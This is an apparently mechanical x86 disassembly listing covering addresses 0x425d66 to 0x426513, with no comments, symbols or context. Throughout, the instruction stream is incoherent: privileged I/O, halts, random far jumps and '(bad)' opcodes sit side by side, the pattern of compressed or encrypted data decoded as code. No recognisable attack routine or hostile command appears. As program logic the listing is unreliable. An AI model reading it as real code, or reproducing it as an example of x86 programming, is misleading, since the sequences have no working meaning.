  425d66:	mov    BYTE PTR [edx-0x31],dh
  425d69:	jb     0x425cfe
  425d6b:	add    BYTE PTR [edi-0x4b47a0a8],ah
  425d71:	mov    bh,0x16
  425d73:	clc    
  425d74:	jge    0x425cf8
  425d76:	pop    ss
  425d77:	xor    eax,0xcd188a5b
  425d7c:	jne    0x425dbf
  425d7e:	adc    BYTE PTR [ebp-0x56],0xb0
  425d82:	or     eax,0x1a797b21
  425d87:	js     0x425d6d
  425d89:	sub    al,0x26
  425d8b:	xchg   esp,eax
  425d8c:	aam    0xfc
  425d8e:	add    al,0x9f
  425d90:	cmp    ch,cl
  425d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d93:	imul   ecx,DWORD PTR [esi+eiz*1],0x62
  425d97:	mov    ds:0xa0923f66,eax
  425d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d9d:	test   eax,0x8517f965
  425da2:	mov    eax,0xba0f34ce
  425da7:	push   es
  425da8:	pop    ebp
  425da9:	loopne 0x425d56
  425dab:	in     al,0x35
  425dad:	jp     0x425da9
  425daf:	inc    ecx
  425db0:	les    ebp,FWORD PTR [ecx+0x79]
  425db3:	inc    ebx
  425db4:	lods   al,BYTE PTR ds:[esi]
  425db5:	iret   
  425db6:	inc    edi
  425db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425db8:	shl    DWORD PTR [edi+ebx*1+0x6f],1
  425dbc:	sahf   
  425dbd:	sub    DWORD PTR [ebp+0x2159aaa6],ebx
  425dc3:	and    eax,0xa329a78c
  425dc8:	loope  0x425d95
  425dca:	sar    DWORD PTR [edi+0x35d676d6],0x99
  425dd1:	call   FWORD PTR [ebx-0x3f]
  425dd4:	dec    esi
  425dd5:	inc    ecx
  425dd6:	ret    0x4f49
  425dd9:	push   cs
  425dda:	cld    
  425ddb:	jp     0x425e3a
  425ddd:	fs cmp bh,al
  425de0:	jmp    edi
  425de2:	int    0xa8
  425de4:	sar    cl,0x6
  425de7:	push   esp
  425de8:	jecxz  0x425d9b
  425dea:	fld    DWORD PTR [eax+0x2f]
  425ded:	leave  
  425dee:	xchg   edx,eax
  425def:	push   cs
  425df0:	int3   
  425df1:	push   eax
  425df2:	xchg   BYTE PTR [eax+0x2b0c7acc],cl
  425df8:	fs (bad) 
  425dfa:	pusha  
  425dfb:	cwde   
  425dfc:	mov    dh,BYTE PTR [ecx+0x44]
  425dff:	adc    DWORD PTR [eax],edi
  425e01:	xor    ch,BYTE PTR [esi-0x2f]
  425e04:	cmp    DWORD PTR [ebp+0x7c],eax
  425e07:	data16 jno 0x425e07
  425e0a:	xchg   esi,eax
  425e0b:	int3   
  425e0c:	test   BYTE PTR [esi-0x7eedaaf5],bl
  425e12:	mov    eax,0xd5055443
  425e17:	and    esi,edi
  425e19:	sub    edx,DWORD PTR [eax]
  425e1b:	jmp    0x81c5:0x6a18167f
  425e22:	leave  
  425e23:	jmp    0xb7a7:0x9054b187
  425e2a:	mov    eax,ds:0xd89bd19b
  425e2f:	pushf  
  425e30:	sar    esp,0xdf
  425e33:	lods   eax,DWORD PTR ds:[esi]
  425e34:	sahf   
  425e35:	mov    ch,0xb3
  425e37:	mov    DWORD PTR [edi-0x6fae8a91],eax
  425e3d:	das    
  425e3e:	inc    edx
  425e3f:	and    dh,0xb9
  425e42:	mov    ebx,DWORD PTR [edi-0x698d4882]
  425e48:	jbe    0x425de4
  425e4a:	popa   
  425e4b:	mov    cl,0x83
  425e4d:	mov    eax,0x372000e4
  425e52:	ret    0x580
  425e55:	and    eax,0xdd0e347b
  425e5a:	fcomp  QWORD PTR [esi]
  425e5c:	ret    0x8e3c
  425e5f:	or     ebx,ebp
  425e61:	inc    eax
  425e62:	jge    0x425e60
  425e64:	xchg   esp,eax
  425e65:	(bad)  
  425e66:	dec    ebp
  425e67:	cmc    
  425e68:	addr16 gs (bad) 
  425e6b:	fcomp  DWORD PTR [edi]
  425e6d:	add    edi,DWORD PTR [eax-0x59e6e5d6]
  425e73:	pmaxsw mm3,QWORD PTR [ebx+0x11]
  425e77:	stos   BYTE PTR es:[edi],al
  425e78:	pop    esp
  425e79:	les    edx,FWORD PTR [edi-0x1defac7e]
  425e7f:	and    bl,BYTE PTR [edx-0x1c]
  425e82:	fist   WORD PTR [esi+eax*4]
  425e85:	pop    eax
  425e86:	jb     0x425e9a
  425e88:	mov    DWORD PTR [edx],ebx
  425e8a:	test   DWORD PTR [edx-0x67],esp
  425e8d:	outs   dx,BYTE PTR ds:[esi]
  425e8e:	push   es
  425e8f:	shl    DWORD PTR [ebp-0x3],1
  425e92:	pop    ds
  425e93:	in     al,0x5b
  425e95:	jno    0x425ed2
  425e97:	imul   edx,edi,0x2f
  425e9a:	add    bl,0x42
  425e9d:	add    DWORD PTR [edi-0x7119a1e5],edx
  425ea3:	pop    ebp
  425ea4:	xchg   BYTE PTR [edx-0x23b39b33],bl
  425eaa:	xchg   ebx,eax
  425eab:	in     eax,dx
  425eac:	pop    ebp
  425ead:	cmp    eax,0xd2ef28c6
  425eb2:	or     eax,0xdc2c307d
  425eb7:	inc    esp
  425eb8:	jge    0x425e5e
  425eba:	sub    cl,bl
  425ebc:	pop    ecx
  425ebd:	jmp    0x6c9534e9
  425ec2:	jl     0x425e5b
  425ec4:	push   ebx
  425ec5:	lods   al,BYTE PTR ds:[esi]
  425ec6:	fnstenv [eax]
  425ec8:	mov    WORD PTR [eax+0x19],fs
  425ecb:	mov    ch,0xb8
  425ecd:	inc    edi
  425ece:	cld    
  425ecf:	ror    BYTE PTR [ebp+0x58],cl
  425ed2:	popf   
  425ed3:	mov    al,0xc2
  425ed5:	push   ebx
  425ed6:	mov    esi,0x19fb186e
  425edb:	jno    0x425f33
  425edd:	dec    esp
  425ede:	or     bh,BYTE PTR [edx]
  425ee0:	gs call 0x8a8a:0x4a9a4b77
  425ee8:	xchg   ecx,eax
  425ee9:	cwde   
  425eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eeb:	or     al,0x3b
  425eed:	mov    eax,0x500c59df
  425ef2:	inc    ebp
  425ef3:	mov    ebx,ss
  425ef5:	int    0x22
  425ef7:	ss xchg ebp,eax
  425ef9:	ror    ecx,0x8a
  425efc:	dec    esi
  425efd:	add    ebp,DWORD PTR [ebx+edi*2+0x56]
  425f01:	fsub   DWORD PTR [esi+0x154ca1a8]
  425f07:	mov    ecx,0x4ab7481c
  425f0c:	sub    al,0x19
  425f0e:	mov    esi,0x89f56392
  425f13:	sub    ebx,ebx
  425f15:	dec    ebx
  425f16:	add    eax,0x836074d9
  425f1b:	aam    0x74
  425f1d:	pushf  
  425f1e:	mov    ah,BYTE PTR [ecx]
  425f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f21:	imul   BYTE PTR [esi+0x27]
  425f24:	nop
  425f25:	mov    BYTE PTR [eax+edi*8-0x3b],dh
  425f29:	xchg   DWORD PTR [ebx-0x3c],esi
  425f2c:	mov    al,ds:0x83465ea4
  425f31:	inc    esp
  425f32:	cmp    eax,0xe012d861
  425f37:	jmp    0x8e62e20d
  425f3c:	mov    ebp,0xe7088db1
  425f41:	hlt    
  425f42:	cmc    
  425f43:	fwait
  425f44:	jge    0x425f35
  425f46:	aam    0xcb
  425f48:	sub    ecx,DWORD PTR [eax+eiz*8-0x78]
  425f4c:	push   ebx
  425f4d:	sar    ecx,0x6a
  425f50:	and    edx,DWORD PTR [ecx-0x4d47acbf]
  425f56:	aad    0xcc
  425f58:	xchg   esp,eax
  425f59:	sahf   
  425f5a:	push   ebx
  425f5b:	push   ecx
  425f5c:	pop    ss
  425f5d:	enter  0x784f,0x6
  425f61:	dec    edi
  425f62:	ss gs pop ds
  425f65:	mov    dh,0x68
  425f67:	adc    DWORD PTR [ecx],ebx
  425f69:	push   ebx
  425f6a:	jle    0x425f15
  425f6c:	push   ds
  425f6d:	pop    ecx
  425f6e:	mov    ds:0xae2ff80c,al
  425f73:	mov    ecx,0x1edcc345
  425f78:	mov    ch,cl
  425f7a:	sahf   
  425f7b:	daa    
  425f7c:	pop    ebx
  425f7d:	mov    ebp,0x9b1222ff
  425f82:	and    BYTE PTR [edi],dh
  425f84:	loope  0x425fb2
  425f86:	clc    
  425f87:	inc    DWORD PTR [edi+0x5f]
  425f8a:	mov    bl,0x45
  425f8c:	cli    
  425f8d:	jl     0x425ff3
  425f8f:	shl    BYTE PTR [ebp+0x374bb805],0x9a
  425f96:	cld    
  425f97:	cld    
  425f98:	add    esp,esp
  425f9a:	xor    DWORD PTR [edx+0x24ac876f],0x6b8d8700
  425fa4:	or     eax,0xe5b34571
  425fa9:	jmp    0x57b64371
  425fae:	adc    ebp,eax
  425fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fb1:	sub    DWORD PTR [eax],eax
  425fb3:	(bad)  
  425fb4:	es mov ah,0x87
  425fb7:	je     0x426010
  425fb9:	fisttp WORD PTR [ecx+0x6c]
  425fbc:	or     bh,ch
  425fbe:	jno    0x425f81
  425fc0:	sar    BYTE PTR [ecx+edx*2],1
  425fc3:	out    dx,eax
  425fc4:	jb     0x425ff5
  425fc6:	xor    DWORD PTR [ecx],edx
  425fc8:	xchg   edi,eax
  425fc9:	inc    ebx
  425fca:	ins    BYTE PTR es:[edi],dx
  425fcb:	mov    dh,al
  425fcd:	push   esp
  425fce:	popa   
  425fcf:	stos   BYTE PTR es:[edi],al
  425fd0:	ret    
  425fd1:	aad    0xec
  425fd3:	sub    al,0x6d
  425fd5:	out    dx,al
  425fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fd7:	jns    0x426042
  425fd9:	pop    ebx
  425fda:	mov    ebx,0x6526bbc6
  425fdf:	jge    0x425fd4
  425fe1:	dec    edx
  425fe2:	dec    esi
  425fe3:	xor    al,0x92
  425fe5:	jmp    0xf0e3:0xb3d5891e
  425fec:	arpl   WORD PTR [edx+0x692ff68f],sp
  425ff2:	push   es
  425ff3:	out    0x2d,al
  425ff5:	pop    ds
  425ff6:	test   DWORD PTR [edi+0x7b],0x47825e2
  425ffd:	stos   BYTE PTR es:[edi],al
  425ffe:	xchg   edi,eax
  425fff:	pop    ebp
  426000:	lds    eax,FWORD PTR [ebx]
  426002:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  426004:	push   esi
  426005:	int3   
  426006:	test   BYTE PTR [edi+esi*8+0x742e4982],ch
  42600d:	sub    al,0x1f
  42600f:	sbb    al,0x88
  426011:	(bad)  
  426012:	and    DWORD PTR [ebx+0x282cdc70],0x7bb90729
  42601c:	jle    0x425ff1
  42601e:	push   eax
  42601f:	into   
  426020:	(bad)  
  426022:	scas   al,BYTE PTR es:[edi]
  426023:	inc    eax
  426024:	fisttp WORD PTR [ecx-0x33]
  426027:	into   
  426028:	push   ss
  426029:	lods   eax,DWORD PTR ds:[esi]
  42602a:	cmp    eax,0x2a06336d
  42602f:	or     edx,DWORD PTR [ebp+0x5952eb18]
  426035:	dec    edi
  426036:	xchg   esi,eax
  426037:	clc    
  426038:	xchg   DWORD PTR [edi+eiz*8-0x61],ecx
  42603c:	or     DWORD PTR [ecx-0x31],ecx
  42603f:	xor    BYTE PTR [ebx],al
  426041:	add    eax,0xb912ffec
  426046:	scas   eax,DWORD PTR es:[edi]
  426047:	call   0xf87f:0xa668c4ed
  42604e:	js     0x426041
  426050:	dec    ebx
  426051:	ds add eax,0x1fad9c3a
  426057:	loope  0x426037
  426059:	xor    eax,0xa422c2df
  42605e:	imul   esi,ebp,0xc234b892
  426064:	retf   
  426065:	arpl   WORD PTR [edx-0x24e660b1],bp
  42606b:	mov    DWORD PTR [edx+0x18eddad9],esi
  426071:	inc    esi
  426072:	stc    
  426073:	clc    
  426074:	cmc    
  426075:	sbb    DWORD PTR [esi+0x37],esp
  426078:	mov    cl,0x11
  42607a:	dec    ebp
  42607b:	mov    cl,BYTE PTR [ebx-0x79]
  42607e:	mov    WORD PTR [ebp+0x40],ds
  426081:	mov    ebp,DWORD PTR [esi+0x78]
  426084:	add    DWORD PTR [esi-0x7cab49f2],edi
  42608a:	cmp    DWORD PTR [edx+0x51a60c43],edi
  426090:	aam    0xa3
  426092:	mov    ch,BYTE PTR [eax]
  426094:	out    dx,al
  426095:	aad    0x11
  426097:	push   edi
  426098:	outs   dx,BYTE PTR ds:[esi]
  426099:	jo     0x42607c
  42609b:	adc    al,0xb8
  42609d:	xchg   DWORD PTR [ecx-0x13398908],ecx
  4260a3:	cli    
  4260a4:	sub    DWORD PTR [bx],ebp
  4260a7:	mov    cl,0xd8
  4260a9:	es inc ebx
  4260ab:	mov    al,ah
  4260ad:	mov    esp,0xc54d2369
  4260b2:	jge    0x426108
  4260b4:	scas   eax,DWORD PTR es:[edi]
  4260b5:	jmp    0x7c012e86
  4260ba:	dec    ebp
  4260bb:	gs ss push ss
  4260be:	cwde   
  4260bf:	or     DWORD PTR [ebx-0x3c0b9fcf],esi
  4260c5:	dec    esp
  4260c6:	mov    dh,0x37
  4260c8:	sub    al,0xfd
  4260ca:	stos   DWORD PTR es:[edi],eax
  4260cb:	xchg   ebp,eax
  4260cc:	outs   dx,BYTE PTR ds:[esi]
  4260cd:	jmp    0x426113
  4260cf:	cmp    DWORD PTR [edx+0x107ac51e],eax
	...
  4260e1:	sbb    ch,al
  4260e3:	mov    ebx,esp
  4260e5:	sti    
  4260e6:	call   FWORD PTR [edi-0x12]
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    esi,DWORD PTR [ebx-0x569c6284]
  4260f2:	xlat   BYTE PTR ds:[ebx]
  4260f3:	add    DWORD PTR [eax],eax
  4260f5:	lods   al,BYTE PTR ds:[esi]
  4260f6:	add    eax,DWORD PTR [eax]
  4260f8:	add    BYTE PTR [ebx+edx*4+0x372c66f0],bl
  4260ff:	out    dx,eax
  426100:	cmp    edx,DWORD PTR [ebx]
  426102:	jg     0x426178
  426104:	fist   DWORD PTR [eax-0x3d]
  426107:	pop    ss
  426108:	pusha  
  426109:	sbb    esi,DWORD PTR [eax]
  42610b:	xchg   edx,eax
  42610c:	je     0x4260cd
  42610e:	mov    al,es:0x84a3c51f
  426114:	xchg   esp,eax
  426115:	sar    BYTE PTR [ebp-0x464a1a02],cl
  42611b:	mov    esi,0x58c832be
  426120:	inc    ebx
  426121:	(bad)  [ebp+0x417879cb]
  426127:	popf   
  426128:	add    ecx,DWORD PTR [eax]
  42612a:	ins    DWORD PTR es:[edi],dx
  42612b:	test   al,0x44
  42612d:	mov    bl,0x99
  42612f:	jp     0x426100
  426131:	adc    DWORD PTR [edx],0x3a05d4b5
  426137:	jecxz  0x42614c
  426139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42613a:	xchg   edx,eax
  42613b:	jg     0x4260f4
  42613d:	scas   al,BYTE PTR es:[edi]
  42613e:	lahf   
  42613f:	add    eax,0x1052129
  426144:	outs   dx,BYTE PTR ds:[esi]
  426145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426146:	mov    edx,0x791a4afd
  42614b:	shl    al,0xb5
  42614e:	push   esp
  42614f:	push   ebx
  426150:	rcr    BYTE PTR [edi],0xf6
  426153:	jae    0x426140
  426155:	inc    esp
  426156:	mov    ch,0x9c
  426158:	cmp    al,0x1
  42615a:	mov    ah,0xf
  42615c:	add    eax,esi
  42615e:	or     DWORD PTR [ecx-0x11],0x873a3fba
  426165:	or     DWORD PTR [edi],0xfffffffb
  426168:	push   esi
  426169:	mov    bh,0xaa
  42616b:	sub    BYTE PTR [ebx+ecx*2],dh
  42616e:	fmul   DWORD PTR [edx-0x1535f7ed]
  426174:	cmp    DWORD PTR [edx+0x15d3f039],0xffffffae
  42617b:	test   BYTE PTR [esi+0x76cae4f2],bl
  426181:	add    BYTE PTR [edx],dh
  426183:	inc    edi
  426184:	sub    DWORD PTR [ebx],ebx
  426186:	inc    esp
  426187:	xchg   DWORD PTR [ecx+0x51],edx
  42618a:	cmp    al,0xbb
  42618c:	push   ss
  42618d:	jb     0x426152
  42618f:	push   esi
  426190:	retf   0x7b0a
  426193:	daa    
  426194:	sbb    ch,BYTE PTR [edi+0x7a]
  426197:	cld    
  426198:	push   ds
  426199:	scas   eax,DWORD PTR es:[edi]
  42619a:	ins    BYTE PTR es:[edi],dx
  42619b:	or     al,0x35
  42619d:	xor    ch,al
  42619f:	xor    cl,bl
  4261a1:	ror    dl,1
  4261a3:	cmp    ebx,ebx
  4261a5:	mov    ds:0x97656788,eax
  4261aa:	ins    BYTE PTR es:[edi],dx
  4261ab:	fs scas al,BYTE PTR es:[edi]
  4261ad:	cmp    ebx,DWORD PTR [edi-0x25]
  4261b0:	pushf  
  4261b1:	sub    bl,BYTE PTR [edx+ecx*8+0x38]
  4261b5:	fidivr WORD PTR [eax-0x362d5641]
  4261bb:	jb     0x42623c
  4261bd:	jge    0x426181
  4261bf:	sbb    di,bp
  4261c2:	xchg   esp,eax
  4261c3:	sbb    dh,BYTE PTR ds:0xc5d59ebc
  4261c9:	retf   
  4261ca:	pop    esp
  4261cb:	push   eax
  4261cc:	adc    dh,ah
  4261ce:	push   edx
  4261cf:	les    edx,FWORD PTR [edi]
  4261d1:	push   eax
  4261d2:	fs test eax,0xccc98ab6
  4261d8:	mov    ecx,0xcdb8eb55
  4261dd:	sbb    edx,ebx
  4261df:	adc    esi,DWORD PTR [edx]
  4261e1:	sahf   
  4261e2:	out    0xfa,eax
  4261e4:	add    ah,BYTE PTR [edx]
  4261e6:	cs gs sbb al,0x92
  4261ea:	adc    DWORD PTR [esi+0x48],ebp
  4261ed:	or     ebp,DWORD PTR [ecx+0x7f]
  4261f0:	or     BYTE PTR [ebx-0x5d],ch
  4261f3:	xchg   edi,eax
  4261f4:	aaa    
  4261f5:	xor    edx,DWORD PTR [eax+0x28d99ced]
  4261fb:	inc    edi
  4261fc:	inc    edx
  4261fd:	xchg   edx,ebp
  4261ff:	and    DWORD PTR [esi],0x62f9e6fa
  426205:	add    eax,0x7e9af61c
  42620a:	pop    ecx
  42620b:	ins    DWORD PTR es:[edi],dx
  42620c:	pop    ebp
  42620d:	lahf   
  42620e:	cwde   
  42620f:	(bad)  
  426210:	shl    DWORD PTR [edx],0x7d
  426213:	pop    ebx
  426214:	hlt    
  426215:	iret   
  426216:	iret   
  426217:	call   0x83fc:0xa89a8a63
  42621e:	ss leave 
  426220:	dec    edi
  426221:	les    edi,FWORD PTR [eax]
  426223:	shl    DWORD PTR [ecx-0x312edb4b],cl
  426229:	or     al,ch
  42622b:	push   eax
  42622c:	lods   al,BYTE PTR ds:[esi]
  42622d:	sahf   
  42622e:	pop    esp
  42622f:	out    0xad,al
  426231:	push   edi
  426232:	hlt    
  426233:	pop    edi
  426234:	loope  0x42623e
  426236:	cmp    edx,DWORD PTR [eax]
  426238:	jmp    0xbd4d:0xa2b0dbff
  42623f:	in     eax,0x87
  426241:	fwait
  426242:	push   eax
  426243:	adc    DWORD PTR [eax],ebx
  426245:	cmp    eax,0x5468218c
  42624a:	sahf   
  42624b:	push   es
  42624c:	xchg   DWORD PTR [eax+edx*4],ebp
  42624f:	aas    
  426250:	arpl   si,cx
  426252:	add    BYTE PTR [ebp-0x50],0x98
  426256:	push   esi
  426257:	and    DWORD PTR ds:0xf64408d1,eax
  42625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42625e:	pop    ebx
  42625f:	fld    TBYTE PTR [edx-0x7b]
  426262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426263:	xchg   ebp,eax
  426264:	in     al,dx
  426265:	aaa    
  426266:	fadd   DWORD PTR [edi]
  426268:	fistp  WORD PTR [eax+0x76156349]
  42626e:	jbe    0x42627e
  426270:	mov    ah,0x15
  426272:	inc    ecx
  426273:	jne    0x4262af
  426275:	scas   eax,DWORD PTR es:[edi]
  426276:	lock aaa 
  426278:	pop    ebx
  426279:	xor    al,0x4e
  42627b:	hlt    
  42627c:	enter  0x6612,0xee
  426280:	retf   
  426281:	rcl    BYTE PTR ds:0xfbb7457e,1
  426287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426289:	or     BYTE PTR [ebx+0xb99bcc9],0x6d
  426290:	dec    edx
  426291:	aam    0xcd
  426293:	mov    bl,0x37
  426295:	mov    ds:0xb11d0588,al
  42629a:	push   esp
  42629b:	dec    edx
  42629c:	adc    dh,dl
  42629e:	out    0x4,al
  4262a0:	int    0xb1
  4262a2:	fcomp  QWORD PTR [ecx+0x4ba3a5df]
  4262a8:	push   ss
  4262a9:	sbb    bl,0xe5
  4262ac:	out    dx,al
  4262ad:	adc    eax,0x55d4933d
  4262b2:	add    bl,0x72
  4262b5:	or     BYTE PTR [esi-0x6b],bh
  4262b8:	out    dx,eax
  4262b9:	sbb    BYTE PTR [eax],ch
  4262bb:	dec    ecx
  4262bc:	popa   
  4262bd:	inc    ecx
  4262be:	xchg   esi,eax
  4262bf:	xor    BYTE PTR [ecx-0x2c5c5ea7],ah
  4262c5:	add    DWORD PTR [edi-0x5e591918],ecx
  4262cb:	mov    dl,0x85
  4262cd:	xchg   ebp,eax
  4262ce:	jbe    0x426283
  4262d0:	add    edi,edx
  4262d2:	and    eax,0x213aa95
  4262d7:	ja     0x426296
  4262d9:	sub    DWORD PTR [esi],ebp
  4262db:	adc    eax,0x2e48a8c8
  4262e0:	inc    esp
  4262e1:	sub    BYTE PTR [esi-0x4c],bl
  4262e4:	jb     0x75edb0af
  4262ea:	xchg   ebp,eax
  4262eb:	jg     0x42635f
  4262ed:	lock sbb ebp,edx
  4262f0:	add    esp,DWORD PTR [eax+esi*4+0x43]
  4262f4:	jbe    0x4262a0
  4262f6:	jae    0x426331
  4262f8:	jge    0x4262ec
  4262fa:	pushf  
  4262fb:	call   0xb130f48b
  426300:	push   ebx
  426301:	shl    al,1
  426303:	xchg   esi,eax
  426304:	pop    eax
  426305:	in     eax,0x6f
  426307:	pop    DWORD PTR [edi-0x7a631b37]
  42630d:	lock xchg edx,eax
  42630f:	dec    esi
  426310:	inc    esp
  426311:	add    esp,DWORD PTR [eax]
  426313:	inc    eax
  426314:	push   0x142fc387
  426319:	sub    al,0x4
  42631b:	xchg   BYTE PTR [ebp-0x32],bl
  42631e:	push   ebp
  42631f:	sub    bl,al
  426321:	in     eax,0x9b
  426323:	or     al,0x87
  426325:	aam    0x86
  426327:	in     eax,0x47
  426329:	or     eax,0xc336c64e
  42632e:	cmp    edx,ebx
  426330:	leave  
  426331:	into   
  426332:	pusha  
  426333:	je     0x4262db
  426335:	aam    0x54
  426337:	cmp    BYTE PTR [ecx+esi*4-0x51],bh
  42633b:	imul   ebx,DWORD PTR [ebx],0x2934bdc3
  426341:	lods   eax,DWORD PTR ds:[esi]
  426342:	mov    BYTE PTR [ebx],dh
  426344:	sbb    DWORD PTR [edx-0x38],0x86f43484
  42634b:	ds inc esi
  42634d:	ins    BYTE PTR es:[edi],dx
  42634e:	cli    
  42634f:	retf   0xd197
  426352:	sub    dh,BYTE PTR [edi+0x17]
  426355:	adc    edx,eax
  426357:	ss mov ecx,0x46885f2e
  42635d:	ret    
  42635e:	mov    bh,0x17
  426360:	cmp    bh,BYTE PTR [edx-0x28]
  426363:	push   edx
  426364:	cli    
  426365:	adc    ch,BYTE PTR ds:0x4440cfb7
  42636b:	add    esi,esi
  42636d:	aad    0x73
  42636f:	mov    bh,0x93
  426371:	es jno 0x42634c
  426374:	shr    DWORD PTR [ebp+0x4e],1
  426377:	jmp    0x4263b8
  426379:	inc    esp
  42637a:	inc    eax
  42637b:	sub    eax,0xa230f711
  426380:	push   eax
  426381:	and    esi,DWORD PTR [edi+eiz*1]
  426384:	push   esp
  426385:	mov    ds:0x4c9c4ecc,al
  42638a:	test   eax,0x1438b474
  42638f:	test   BYTE PTR [ebx-0x7508c8c5],dh
  426395:	mov    bh,0x75
  426397:	mov    al,ds:0x5fd3732d
  42639c:	iret   
  42639d:	pop    edi
  42639e:	push   cs
  42639f:	dec    ebx
  4263a0:	and    ebp,ecx
  4263a2:	push   es
  4263a3:	or     BYTE PTR [ecx+0x31],cl
  4263a6:	inc    edx
  4263a7:	cdq    
  4263a8:	jno    0x426349
  4263aa:	fadd   QWORD PTR [ebx+eiz*8]
  4263ad:	pop    ss
  4263ae:	outs   dx,BYTE PTR es:[esi]
  4263b0:	rcl    DWORD PTR [ebp+0x703191d],0x7b
  4263b7:	and    eax,0x8f2d9460
  4263bc:	jmp    0x42637c
  4263be:	mov    al,ds:0xfc421b4d
  4263c3:	clc    
  4263c4:	adc    bh,BYTE PTR [esi+0x65]
  4263c7:	bound  eax,QWORD PTR [ebx+0x63]
  4263ca:	stos   BYTE PTR es:[edi],al
  4263cb:	add    DWORD PTR [edi+esi*8-0x50],eax
  4263cf:	mov    ebp,DWORD PTR [eax+0x38]
  4263d2:	cmp    eax,0x84142612
  4263d7:	shl    BYTE PTR [ebp-0x9099f0d],0x64
  4263de:	fwait
  4263df:	add    ebx,eax
  4263e1:	stos   DWORD PTR es:[edi],eax
  4263e2:	xor    eax,0x4d9ab73
  4263e7:	pop    eax
  4263e8:	xor    eax,0xc6cad046
  4263ed:	mov    al,ds:0x45601670
  4263f2:	sub    bl,BYTE PTR [edi+0x5623a03d]
  4263f8:	and    DWORD PTR [esi],ebx
  4263fa:	add    ch,BYTE PTR gs:[ecx+0x365f57a4]
  426401:	mov    DWORD PTR [ecx+0x3c318700],edx
  426407:	sub    DWORD PTR [ebp+0x3f],edx
  42640a:	ret    
  42640b:	rcl    DWORD PTR [ebp-0x4a],1
  42640e:	dec    esp
  42640f:	cmp    cl,dl
  426411:	pop    edi
  426412:	sbb    DWORD PTR [eax-0x6f],ebp
  426415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426416:	leave  
  426417:	int    0xd6
  426419:	add    dh,BYTE PTR [esi]
  42641b:	and    DWORD PTR [ebp+0x59],ebp
  42641e:	sbb    eax,0x45fe5223
  426423:	ins    BYTE PTR es:[edi],dx
  426424:	mov    eax,0x98f0f04b
  426429:	pop    es
  42642a:	xchg   ebp,eax
  42642b:	ins    BYTE PTR es:[edi],dx
  42642c:	jbe    0x42646a
  42642e:	add    DWORD PTR [ebp-0x35],eax
  426431:	shl    BYTE PTR [ebp+0x8],cl
  426434:	pop    es
  426435:	lods   al,BYTE PTR ds:[esi]
  426436:	call   0x970e5f9
  42643b:	aas    
  42643c:	jns    0x42644d
  42643e:	mov    ebp,DWORD PTR [eax]
  426440:	not    BYTE PTR [ecx]
  426442:	mov    bh,0x5
  426444:	sub    esp,edx
  426446:	xchg   esp,eax
  426447:	push   0xfffffffc
  426449:	sbb    BYTE PTR [ebx+0x24],ch
  42644c:	jmp    0x91fe:0xaead665f
  426453:	pop    ecx
  426454:	lock push ebp
  426456:	repz scas al,BYTE PTR es:[edi]
  426458:	sub    dh,BYTE PTR [eax-0x318d9910]
  42645e:	jmp    0x426403
  426460:	push   ebp
  426461:	push   edx
  426462:	imul   esp,eax,0xffffffa0
  426465:	test   eax,0x64796a0a
  42646a:	imul   esp,DWORD PTR [ebp-0x4e86a6d5],0xffffffcd
  426471:	jb     0x426499
  426473:	daa    
  426474:	shr    DWORD PTR [esi+eiz*4],cl
  426477:	inc    ebx
  426478:	jle    0x426498
  42647a:	leave  
  42647b:	ss jge 0x426483
  42647e:	inc    edx
  42647f:	(bad)  
  426480:	mov    al,ds:0x82cf03a4
  426485:	(bad)  
  426486:	mov    eax,DWORD PTR [ecx]
  426488:	into   
  426489:	jbe    0x4264be
  42648b:	sub    eax,0x6e3860c3
  426490:	pop    esp
  426491:	sub    eax,0xcbc09140
  426496:	pop    esi
  426497:	and    al,0xb0
  426499:	and    DWORD PTR [eax-0x55],0x72
  42649d:	dec    edx
  42649e:	aaa    
  42649f:	addr16 or eax,0x23f09851
	...
  4264b1:	loop   0x42652e
  4264b3:	push   ecx
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     edi,eax
  4264be:	stc    
  4264bf:	cmc    
  4264c0:	ret    0xdb55
  4264c3:	add    DWORD PTR [eax],eax
  4264c5:	lods   al,BYTE PTR ds:[esi]
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    ch,dl
  4264ca:	leave  
  4264cb:	xor    esi,DWORD PTR [ebx]
  4264cd:	cld    
  4264ce:	repz push ss
  4264d0:	shl    bl,cl
  4264d2:	ins    BYTE PTR es:[edi],dx
  4264d3:	pop    ebp
  4264d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264d5:	lods   eax,DWORD PTR ds:[esi]
  4264d6:	push   0x6fcecc9a
  4264db:	xchg   DWORD PTR [ebx-0x2ed1e00f],ebp
  4264e1:	shl    DWORD PTR [ebx-0x11],cl
  4264e4:	retf   
  4264e5:	test   al,0x74
  4264e7:	xchg   ebx,eax
  4264e8:	xor    BYTE PTR [edx],cl
  4264ea:	loopne 0x426560
  4264ec:	test   eax,0xd19241db
  4264f1:	rcr    dl,0x55
  4264f4:	push   ss
  4264f5:	fldpi  
  4264f7:	xor    BYTE PTR [ebp+0x76396baa],dl
  4264fd:	xlat   BYTE PTR ds:[ebx]
  4264fe:	dec    ebp
  4264ff:	xchg   DWORD PTR [edi+0x34],ecx
  426502:	mov    ds:0xef80bbcf,eax
  426507:	imul   edx,DWORD PTR [ecx],0xffffffb9
  42650a:	mov    esi,0xaf71929
  42650f:	scas   eax,DWORD PTR es:[edi]
  426510:	cwde   
  426511:	je     0x4264ab
  426513:	popa   
